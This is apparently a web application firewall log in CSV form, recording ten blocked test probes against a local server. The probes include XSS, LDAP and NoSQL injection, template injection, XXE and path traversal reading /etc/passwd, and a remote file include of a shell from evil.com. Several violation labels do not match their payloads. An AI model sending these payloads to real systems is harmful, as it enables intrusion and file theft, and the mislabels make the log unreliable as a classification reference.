timestamp,event_name,violation_type,signature_name,source_ip,destination_ip,source_port,destination_port,device_action,requested_url,response_code,referer,user_agent
2026-05-14 10:38:17,WAF_BLOCK,xss,<script>alert(1)</script>,192.168.100.6,192.168.100.6:5000,52439,5000,blocked,http://192.168.100.6:5000/?q=<script>alert(1)</script>,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:41:52,WAF_BLOCK,sql,*)(uid=*))(|(uid=*,192.168.100.6,192.168.100.6:5000,59651,5000,blocked,http://192.168.100.6:5000/?user=*)(uid=*))(|(uid=*,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:45:43,WAF_BLOCK,lfi,https://evil.com,192.168.100.6,192.168.100.6:5000,62568,5000,blocked,http://192.168.100.6:5000/redirect?next=https://evil.com,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:46:19,WAF_BLOCK,lfi,http://evil.com/shell.txt,192.168.100.6,192.168.100.6:5000,53573,5000,blocked,http://192.168.100.6:5000/?page=http://evil.com/shell.txt,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:46:48,WAF_BLOCK,xss,<script>alert(1)</script>,192.168.100.6,192.168.100.6:5000,61469,5000,blocked,http://192.168.100.6:5000/?q=%253Cscript%253Ealert(1)%253C/script%253E,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:47:59,WAF_BLOCK,ssti,{{7*7}},192.168.100.6,192.168.100.6:5000,60937,5000,blocked,http://192.168.100.6:5000/?name={{7*7}},403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:48:30,WAF_BLOCK,xss,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>",192.168.100.6,192.168.100.6:5000,57819,5000,blocked,"http://192.168.100.6:5000/xml?data=<?xml%20version=""1.0""?><!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20""file:///etc/passwd"">]><foo>&xxe;</foo>",403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:48:57,WAF_BLOCK,sql,123,192.168.100.6,192.168.100.6:5000,56034,5000,blocked,http://192.168.100.6:5000/?username[$ne]=admin&password[$ne]=123,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:49:30,WAF_BLOCK,lfi,../../etc/passwd,192.168.100.6,192.168.100.6:5000,57010,5000,blocked,http://192.168.100.6:5000/?file=../../etc/passwd,403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
2026-05-14 10:49:58,WAF_BLOCK,ssti,{{7*7}},192.168.100.6,192.168.100.6:5000,54655,5000,blocked,http://192.168.100.6:5000/?name={{7*7}},403,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
